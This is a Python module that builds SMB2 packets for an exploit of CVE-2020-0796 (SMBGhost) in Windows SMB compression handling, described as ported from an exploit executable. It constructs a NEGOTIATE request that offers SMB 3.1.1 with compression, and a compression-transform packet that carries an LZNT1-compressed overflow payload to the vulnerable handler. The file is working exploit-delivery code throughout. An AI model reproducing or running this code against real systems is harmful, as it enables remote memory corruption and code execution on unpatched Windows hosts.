#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
smb_win.py — SMB2 packet builders for the CVE-2020-0796 exploit.

Python port of `RCE\\smb_win.py` recovered from `CVE-2020-0796-EXP.exe`:

  * SMB2 NEGOTIATE offering SMB 3.1.1 and the pre-auth + compression contexts
  * the SMB2 COMPRESSION_TRANSFORM (`\\xfcSMB`) used to deliver the
    LZNT1-compressed overflow payload to the vulnerable compression handler.
"""

import struct


class Smb2Header:
    def __init__(self, cmd, msg_id):
        self.protocol_id = b'\xfeSMB'
        self.header_length = struct.pack("<H", 64)
        self.credit_charge = struct.pack("<H", 0)
        self.channel_sequence = struct.pack("<H", 0)
        self.reserved = struct.pack("<H", 0)
        self.command = struct.pack("<H", cmd)
        self.credits_requested = struct.pack("<H", 0)
        self.flags = struct.pack("<L", 0)
        self.chain_offset = struct.pack("<L", 0)
        self.message_id = struct.pack("<Q", msg_id)
        self.process_id = struct.pack("<L", 0)
        self.tree_id = struct.pack("<L", 0)
        self.session_id = struct.pack("<Q", 0)
        self.signature = b'\x00' * 16

    def raw_bytes(self):
        return (self.protocol_id + self.header_length + self.credit_charge
                + self.channel_sequence + self.reserved + self.command
                + self.credits_requested + self.flags + self.chain_offset
                + self.message_id + self.process_id + self.tree_id
                + self.session_id + self.signature)


class Smb2PreauthContext:
    def __init__(self):
        self.type = struct.pack("<H", 1)
        self.data_length = struct.pack("<H", 38)
        self.reserved = struct.pack("<L", 0)
        self.hash_algorithm_count = struct.pack("<H", 1)
        self.salt_length = struct.pack("<H", 32)
        self.hash_algorithm = struct.pack("<H", 1)
        self.salt = b'\x00' * 32
        self.padding = struct.pack("<H", 0)

    def raw_bytes(self):
        return (self.type + self.data_length + self.reserved
                + self.hash_algorithm_count + self.salt_length
                + self.hash_algorithm + self.salt + self.padding)


class Smb2CompressionContext:
    def __init__(self):
        self.type = struct.pack("<H", 3)
        self.data_length = struct.pack("<H", 10)
        self.reserved = struct.pack("<L", 0)
        self.compression_algorithm_count = struct.pack("<H", 1)
        self.flags = b'\x00\x00\x01\x00\x00\x00'
        self.compression_algorithm_id = struct.pack("<H", 1)

    def raw_bytes(self):
        return (self.type + self.data_length + self.reserved
                + self.compression_algorithm_count + self.flags
                + self.compression_algorithm_id)


class Smb2NegotiateRequestPacket:
    def __init__(self):
        self.header = Smb2Header(0, 0)
        self.structure_size = struct.pack("<H", 36)
        self.dialect_count = struct.pack("<H", 5)
        self.security_mode = struct.pack("<H", 0)
        self.reserved = struct.pack("<H", 0)
        self.capabilities = struct.pack("<L", 68)
        self.client_guid = b'\x137\xc0\xde' * 4
        self.negotiate_context_offset = struct.pack("<L", 112)
        self.negotiate_context_count = struct.pack("<H", 2)
        self.dialects = b'\x02\x02\x10\x02\x00\x03\x02\x03\x11\x03'
        self.padding = struct.pack("<H", 0)
        self.preauth_context = Smb2PreauthContext()
        self.compression_context = Smb2CompressionContext()

    def raw_bytes(self):
        return (self.header.raw_bytes() + self.structure_size
                + self.dialect_count + self.security_mode + self.reserved
                + self.capabilities + self.client_guid
                + self.negotiate_context_offset + self.negotiate_context_count
                + self.reserved + self.dialects + self.padding
                + self.preauth_context.raw_bytes()
                + self.compression_context.raw_bytes())


class NetBiosSessionPacket:
    def __init__(self, data):
        self.session_message = b'\x00'
        self.length = struct.pack(">L", len(data))[1:4]
        self.data = data

    def raw_bytes(self):
        return self.session_message + self.length + self.data


class Smb2CompressedTransform:
    def __init__(self, compressed_data, decompressed_size, data):
        self.protocol_id = b'\xfcSMB'
        self.original_decompressed_size = struct.pack("<L", decompressed_size)
        self.compression_algorithm = struct.pack("<H", 1)
        self.flags = struct.pack("<H", 0)
        self.offset = struct.pack("<L", len(data))
        self.data = data + compressed_data

    def raw_bytes(self):
        return (self.protocol_id + self.original_decompressed_size
                + self.compression_algorithm + self.flags + self.offset
                + self.data)


def smb_negotiate(sock):
    neg_bytes = Smb2NegotiateRequestPacket().raw_bytes()
    sock.send(NetBiosSessionPacket(neg_bytes).raw_bytes())


def smb_compress(sock, compressed_data, decompressed_size, data):
    comp = Smb2CompressedTransform(compressed_data, decompressed_size, data)
    sock.send(NetBiosSessionPacket(comp.raw_bytes()).raw_bytes())